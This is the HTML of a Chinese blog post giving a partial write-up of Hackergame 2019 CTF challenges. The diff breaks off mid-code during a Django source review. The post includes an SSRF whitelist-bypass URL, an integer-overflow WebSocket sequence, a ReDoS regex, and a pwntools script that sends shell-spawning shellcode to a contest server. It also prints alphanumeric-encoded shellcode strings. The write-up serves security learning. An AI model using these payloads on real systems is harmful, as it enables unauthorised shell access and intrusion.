@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.xhyeax.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="签到题修改页面源码以及js代码，去掉disabled描述符，使用Fiddler替换，然后强制刷新页面即可点击提交按钮得到flag 白与夜图片是qq中常见的隐藏图，个人做这题时是用的手机直接使用自带相册打开即可看到flag 信息安全 2077注意到页面源码中设置了If-Unmodified-Since为当前时间，而返回的Last-Modified是Fri, 01 Oct 2077 00:00:00">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackersgame 2019 部分writeup">
+<meta property="og:url" content="https://blog.xhyeax.com/2019/10/22/hackersgame-2019-writeup/index.html">
+<meta property="og:site_name" content="Xhy&#39;s Blog">
+<meta property="og:description" content="签到题修改页面源码以及js代码，去掉disabled描述符，使用Fiddler替换，然后强制刷新页面即可点击提交按钮得到flag 白与夜图片是qq中常见的隐藏图，个人做这题时是用的手机直接使用自带相册打开即可看到flag 信息安全 2077注意到页面源码中设置了If-Unmodified-Since为当前时间，而返回的Last-Modified是Fri, 01 Oct 2077 00:00:00">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-10-22T01:13:24.411Z">
+<meta property="article:modified_time" content="2025-06-07T10:33:25.795Z">
+<meta property="article:author" content="Xhy">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.xhyeax.com/2019/10/22/hackersgame-2019-writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Hackersgame 2019 部分writeup | Xhy's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ae4f03127de1b8f146f8fe365efac8c4";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Xhy's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Reverse and Think</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-tools">
+
+    <a href="/tools/" rel="section"><i class="fa fa-th fa-fw"></i>工具</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.xhyeax.com/2019/10/22/hackersgame-2019-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/assets/img/avatar.jpg">
+      <meta itemprop="name" content="Xhy">
+      <meta itemprop="description" content="南冥有熊也 (XhyEax)">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xhy's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hackersgame 2019 部分writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-10-22 09:13:24" itemprop="dateCreated datePublished" datetime="2019-10-22T09:13:24+08:00">2019-10-22</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>修改页面源码以及js代码，去掉disabled描述符，使用Fiddler替换，然后强制刷新页面<br>即可点击提交按钮得到flag</p>
+<h2 id="白与夜"><a href="#白与夜" class="headerlink" title="白与夜"></a>白与夜</h2><p>图片是qq中常见的隐藏图，个人做这题时是用的手机<br>直接使用自带相册打开即可看到flag</p>
+<h2 id="信息安全-2077"><a href="#信息安全-2077" class="headerlink" title="信息安全 2077"></a>信息安全 2077</h2><p>注意到页面源码中设置了<code>If-Unmodified-Since</code>为当前时间，而返回的<code>Last-Modified</code>是<code>Fri, 01 Oct 2077 00:00:00 GMT</code>，把<code>If-Unmodified-Since</code>改为该值即可获得flag</p>
+<span id="more"></span>
+<h2 id="宇宙终极问题（部分）"><a href="#宇宙终极问题（部分）" class="headerlink" title="宇宙终极问题（部分）"></a>宇宙终极问题（部分）</h2><h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><p>题目要求给出$x^3+y^3+z^3=42$的整数解，直接百度得到答案</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（-80538738812075974）^3+80435758145817515^3+12602123297335631^3=42</span><br></pre></td></tr></table></figure>
+<p>输入即可得到flag</p>
+<h2 id="网页读取器"><a href="#网页读取器" class="headerlink" title="网页读取器"></a>网页读取器</h2><p>查看源代码，发现check_hostname时会把@之前的字符删掉</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_hostname</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> whitelist_scheme:</span><br><span class="line">        <span class="keyword">if</span> url.startswith(i):</span><br><span class="line">            url = url[<span class="built_in">len</span>(i):]  <span class="comment"># strip scheme</span></span><br><span class="line">            url = url[url.find(<span class="string">&quot;@&quot;</span>) + <span class="number">1</span>:]  <span class="comment"># strip userinfo</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> url.find(<span class="string">&quot;/&quot;</span>) == -<span class="number">1</span>:</span><br><span class="line">                url = url[:url.find(<span class="string">&quot;/&quot;</span>)]  <span class="comment"># strip parts after authority</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> url.find(<span class="string">&quot;:&quot;</span>) == -<span class="number">1</span>:</span><br><span class="line">                url = url[:url.find(<span class="string">&quot;:&quot;</span>)]  <span class="comment"># strip port</span></span><br><span class="line">            <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> whitelist_hostname:</span><br><span class="line">                <span class="keyword">return</span> (<span class="literal">False</span>, <span class="string">&quot;hostname &#123;&#125; not in whitelist&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, <span class="string">&quot;ok&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">False</span>, <span class="string">&quot;scheme not in whitelist, only &#123;&#125; allowed&quot;</span>.<span class="built_in">format</span>(whitelist_scheme))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>构造<code>http://web1/flag@example.com</code>提交，发现不对，于是加了个问号<br>即<code>http://web1/flag?@example.com</code>得到flag</p>
+<h2 id="达拉崩吧大冒险"><a href="#达拉崩吧大冒险" class="headerlink" title="达拉崩吧大冒险"></a>达拉崩吧大冒险</h2><p>查看页面源码可知，使用WebSocket进行数据传输，用户端只能发送数字作为当前选项<br>测试发现在料理大市场买鸡时，可以购买负数的鸡（通过控制台<code>ws.send(-1)发现</code>），猜测此处存在负数溢出漏洞。<br>完整流程代码:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ws.send(<span class="number">0</span>);ws.send(<span class="number">0</span>);<span class="comment">//进入[&quot;料理大市场&quot;,&quot;打怪升级&quot;,&quot;去恶龙洞穴&quot;]选项</span></span><br><span class="line">ws.send(<span class="number">0</span>);ws.send(-<span class="number">3223372036854775807</span>);<span class="comment">//选择料理大市场并购买负数只鸡</span></span><br><span class="line">ws.send(<span class="number">2</span>);<span class="comment">//进入恶龙洞穴</span></span><br><span class="line">ws.send(<span class="number">0</span>);<span class="comment">//对话</span></span><br><span class="line">ws.send(<span class="number">2</span>);<span class="comment">//得到flag</span></span><br></pre></td></tr></table></figure>
+<p>此处使用的负数是<code>MAX_INT64</code> (<code>9223372036854775807</code>)的最高位改成3，一次即可溢出成功，攻击变成了<code>2329883889435671600</code></p>
+<h2 id="Happy-LUG"><a href="#Happy-LUG" class="headerlink" title="Happy LUG"></a>Happy LUG</h2><p>??的Punycode编码是<code>xn--g28h</code>，故组合起来的域名为<br><code>xn--g28h.hack.ustclug.org</code><br>查询该域名的txt记录即可得到flag（手机端可使用<code>Network Tools</code>进行查询）</p>
+<h2 id="正则验证器"><a href="#正则验证器" class="headerlink" title="正则验证器"></a>正则验证器</h2><p>题目说需要找到运行时间超过一秒的正则表达式，查看源码发现还有长度限制<br>正则表达式长度不能大于6，匹配的文本长度不能大于24<br>个人直接百度找到了答案:<br><a target="_blank" rel="noopener" href="http://ju.outofmemory.cn/entry/82230">如何中断一个长时间运行的“无限”Java正则表达式</a><br>正则：<code>(0*)*A</code>，字符：<code>00000000000000000000000</code><br>提交得到flag</p>
+<h2 id="小巧玲珑的-ELF"><a href="#小巧玲珑的-ELF" class="headerlink" title="小巧玲珑的 ELF"></a>小巧玲珑的 ELF</h2><p>IDA打开，查看伪代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> __asm</span><br><span class="line">  &#123;</span><br><span class="line">    syscall; LINUX - sys_write</span><br><span class="line">    syscall; LINUX - sys_read</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">45</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    buf[i] += <span class="number">2</span> * i;</span><br><span class="line">    buf[i] ^= i;</span><br><span class="line">    buf[i] -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">45</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[j] != *(&amp;v0 + j) )</span><br><span class="line">      __asm &#123; syscall; LINUX - sys_exit &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    syscall; LINUX - sys_write</span><br><span class="line">    syscall; LINUX - sys_exit</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中v0到v45是数据段，需要dump出来（建议使用脚本）<br>这题有两种解法：爆破或者逆运算得出的flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x66</span>,<span class="number">0x6e</span>,<span class="number">0x65</span>,<span class="number">0x6b</span>,<span class="number">0x83</span>,<span class="number">0x4e</span>,<span class="number">0x6d</span>,<span class="number">0x74</span>,<span class="number">0x85</span>,<span class="number">0x7a</span>,<span class="number">0x6f</span>,<span class="number">0x57</span>,<span class="number">0x91</span>,<span class="number">0x73</span>,<span class="number">0x90</span>,<span class="number">0x4f</span>,<span class="number">0x8d</span>,<span class="number">0x7f</span>,<span class="number">0x63</span>,<span class="number">0x36</span>,<span class="number">0x6c</span>,<span class="number">0x6e</span>,<span class="number">0x87</span>,<span class="number">0x69</span>,<span class="number">0xa3</span>,<span class="number">0x6f</span>,<span class="number">0x58</span>,<span class="number">0x73</span>,<span class="number">0x66</span>,<span class="number">0x56</span>,<span class="number">0x93</span>,<span class="number">0x9f</span>,<span class="number">0x69</span>,<span class="number">0x70</span>,<span class="number">0x38</span>,<span class="number">0x76</span>,<span class="number">0x71</span>,<span class="number">0x78</span>,<span class="number">0x6f</span>,<span class="number">0x63</span>,<span class="number">0xc4</span>,<span class="number">0x82</span>,<span class="number">0x84</span>,<span class="number">0xbe</span>,<span class="number">0xbb</span>,<span class="number">0xcd</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>):</span><br><span class="line">    x = data[i]</span><br><span class="line">    x += i</span><br><span class="line">    x ^= i</span><br><span class="line">    x -= <span class="number">2</span> * i</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nbrute&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        tmp_x = x</span><br><span class="line">        x += <span class="number">2</span> * i</span><br><span class="line">        x ^= i</span><br><span class="line">        x -= i</span><br><span class="line">        <span class="keyword">if</span>(x==data[i]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(tmp_x),end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Shell三骇客"><a href="#Shell三骇客" class="headerlink" title="Shell三骇客"></a>Shell三骇客</h2><p>本题是<code>ShellCode</code>构造题，只要传入的<code>ShellCode</code>满足过滤条件就会被执行</p>
+<h3 id="ShellHacker1"><a href="#ShellHacker1" class="headerlink" title="ShellHacker1"></a>ShellHacker1</h3><p>64位程序<br>没有任何过滤，使用<code>pwntools</code>生成<code>shellcode</code>，发送即可</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#print(shellcode)</span></span><br><span class="line">token = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#sh = process(&#x27;chall1&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;202.38.93.241&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Please input your token: &quot;</span>)</span><br><span class="line">sh.sendline(token)</span><br><span class="line"></span><br><span class="line">sh.send(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ShellHacker2"><a href="#ShellHacker2" class="headerlink" title="ShellHacker2"></a>ShellHacker2</h3><p>32位程序，逆向得知call地址为eax<br>限制输入为数字和大写字母<br>使用<code>msfvenom</code>对shellcode编码<br>得到</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&quot;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJSXCXVO6OVOCCBH6OE2BI2NRJTKV8MYM36QHILY8MK0AA&quot;</span></span><br></pre></td></tr></table></figure>
+<p>发送即可getshell</p>
+<h3 id="ShellHacker3"><a href="#ShellHacker3" class="headerlink" title="ShellHacker3"></a>ShellHacker3</h3><p>64位程序<br>限制输入为可打印字符<br>使用 <a target="_blank" rel="noopener" href="https://github.com/SkyLined/alpha3">ALPHA3</a> 对shellcode编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ALPHA3.py x64 ascii mixedcase RAX --input=sc.bin</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C101k2m0h2r4y5p164y390U050C&quot;</span></span><br></pre></td></tr></table></figure>
+<p>发送即可getshell</p>
+<h2 id="三教奇妙夜"><a href="#三教奇妙夜" class="headerlink" title="三教奇妙夜"></a>三教奇妙夜</h2><p>解压出一个视频，使用脚本逐帧提取，把0x0为黑色（rgb为[0 0 0]）的图片提取出来<br>然后拼接图片中文字(字体为<code>Dejavu Sans Mono</code>)，即可得到flag</p>
+<h2 id="小-U-的加密"><a href="#小-U-的加密" class="headerlink" title="小 U 的加密"></a>小 U 的加密</h2><p>异或<code>0x39</code>得到一个midi文件(文件头<code>4D 54 68 64</code>)，使用<code>Audacity</code>打开得到flag<br>注：flag 中的字符串全部为英文小写字符。</p>
+<h2 id="献给最好的你"><a href="#献给最好的你" class="headerlink" title="献给最好的你"></a>献给最好的你</h2><p>反编译，定位到<code>com.hackergame.eternalEasterlyWind.data.LoginDataSource</code>类中的<code>login</code>方法<br>大致流程为：<br>对输入的密码进行base64编码，然后把该字符串大小写互转，与<code>pass1</code>:<code>AgfJA2vYz2fTztiWmtL3AxrOzNvUiq==</code>进行对比<br>一致则进入下一流程：<br>调用<code>logout</code>函数对<code>rawpassword</code>和一个自己数组进行运算，得到flag<br>所以对<code>pass1</code>进行大小写互转操作，得到<code>hackergame2019withfun!</code><br>输入即可得到flag<br>（个人是把代码copy出来，直接调用<code>logout</code>函数输出的）</p>
+<h2 id="我想要个家"><a href="#我想要个家" class="headerlink" title="我想要个家"></a>我想要个家</h2><blockquote>
+<p>此题考察的是对于 Linux 基础知识的掌握。尽管可以，但不建议使用逆向工程的方式完成。</p>
+</blockquote>
+<h3 id="一开始的尝试"><a href="#一开始的尝试" class="headerlink" title="一开始的尝试"></a>一开始的尝试</h3><p>首先建立一个文件夹，作为程序执行的根目录（以yourhome为例）<br>并保证只存在这四个目录<code>/Kitchen /Lavatory /Bedroom /Living_Room]</code><br>然后运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /yourhome/ ./IWantAHome-linux</span><br></pre></td></tr></table></figure>
+<p>然后要求<code>/Bedroom/</code>下的<code>Microphone</code>和<code>Headset</code>的内容一致，考察链接的建立，执行语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln Microphone Headset</span><br></pre></td></tr></table></figure>
+<p>然后要求<code>/Living_Room</code>中有一个记录当前时间(格式<code>20:15:30</code>)的<code>Clock</code>文件<br>写个脚本循环输出时间到该文件，另开终端运行，然后重新运行<code>IWantAHome-linux</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">date &quot;+%H:%M:%S&quot; &gt; /yourhome/Living_Room/Clock</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<p>然后要求输入<code>sleep 10 seconds in shell</code>的命令，输入<code>sleep 10</code>提示环境变量中找不到该可执行文件，可见并不是字符串判断<br>于是添加sleep到根目录，执行<code>./sleep 10</code>，提示找不到<code>/dev/null</code>，添加该文件后还是报错，提示<code>fork/exec ./sleep: no such file or directory</code><br>各种尝试，最后还是选择逆向了</p>
+<h3 id="逆向做法"><a href="#逆向做法" class="headerlink" title="逆向做法"></a>逆向做法</h3><p>使用IDA64打开该文件，利用<code>IDAGolangHelper</code>脚本恢复函数名，找到<code>main_main</code>函数，修改执行流程，直接输出flag</p>
+<h2 id="被泄漏的姜戈"><a href="#被泄漏的姜戈" class="headerlink" title="被泄漏的姜戈"></a>被泄漏的姜戈</h2><p>在<code>github</code>找到用户<code>openlug</code>创建的库:<a target="_blank" rel="noopener" href="https://github.com/openlug/django-common">https://github.com/openlug/django-common</a><br>git clone下来，查看<code>app/views.py</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> authenticate, login, logout</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.decorators <span class="keyword">import</span> login_required</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, redirect</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> reverse</span><br><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;Rabbit House 成员管理系统&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.user.is_authenticated:</span><br><span class="line">            <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&#x27;app/index.html&#x27;</span>, &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: name</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.POST[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.POST[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        user = authenticate(request, username=username, password=password)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            login(request, user)</span><br><span class="line">            <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.user.username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        user_profile = <span class="string">&quot;flag redacted. login as admin on server to get flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        user_profile = <span class="string">&quot;仅 admin 用户可阅览 flag。&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;app/profile.html&#x27;</span>, 